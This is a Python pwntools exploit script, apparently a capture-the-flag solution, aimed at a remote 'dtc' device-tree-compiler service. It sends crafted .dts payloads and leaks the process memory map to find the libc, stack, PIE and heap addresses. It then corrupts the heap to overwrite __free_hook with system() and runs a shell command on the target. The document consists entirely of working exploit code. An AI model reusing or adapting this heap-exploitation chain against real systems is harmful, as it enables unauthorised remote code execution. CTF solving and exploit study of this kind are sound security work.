# Exploit written by VoidMercy
from pwn import *

with open("payload1.dts", "rb") as f:
    payload1 = f.read()

with open("payload2.dts", "rb") as f:
    payload2 = f.read()

# r = process(["./dtc", "tmp"], env={"LD_PRELOAD":"./libc-2.31.so"})
# r = process(["./dtc", "tmp"])
r = remote("52.196.81.112", 3154)

r.recvuntil(b"Size?")
r.send(b"%d" % len(payload1) + payload1)

r.recvuntil(b"Data?\n")
r.recvuntil(b"\x00\x00\x00\x03")

tmp_loc = r.recvuntil(b"\x00\x00\x00\x03", drop=True)[14:].rstrip(b"\x00")
print(tmp_loc.decode())

res = r.recvuntil(b"[vsyscall]\n")[8:]
print(res.decode())

libc = 0x0
stack = 0x0
pie = 0x0
heap = 0x0

for i in res.replace(b"\x00", b"\n").split(b"\n"):
    if b"libc-2.31.so" in i and libc == 0x0:
        libc = int(i.strip().split(b"-")[0], 16)
    if b"stack" in i and stack == 0x0:
        stack = int(i.strip().split(b"-")[0], 16)
    if b"dtc" in i and pie == 0x0:
        pie = int(i.strip().split(b"-")[0], 16)
    if b"heap" in i and heap == 0x0:
        heap = int(i.strip().split(b"-")[0], 16)

print("LIBC:", hex(libc))
print("STACK", hex(stack))
print("PIE", hex(pie))
print("HEAP", hex(heap))

free_hook = libc + 0x1eeb28
system = libc + 0x55410

pause()

p = b"A"*0xf8 + p64(0x101) + p64(0x0) + b"B"*0xf0 + p64(0x21) + p64(0x000000f100000008) + p64(0x0) + p64(heap + 0x6a00) + p64(0x1f1) + p64(free_hook-0x10)

cmd = b"ls -al ~"
cmd = cmd + b"\x00"
cmd = cmd + b"A"*(16-len(cmd))
cmd += p64(system)
payload2 = payload2.replace(b"$FILE$", tmp_loc + b"/1").replace(b"$CMD$", cmd)
payload2 = payload2.replace(b"$XX$", b"%d" % len(payload2)) + p

r.send(b"%d" % len(payload2) + payload2)

r.recvuntil(b"Data?\n")
print(r.recvall().strip().decode())
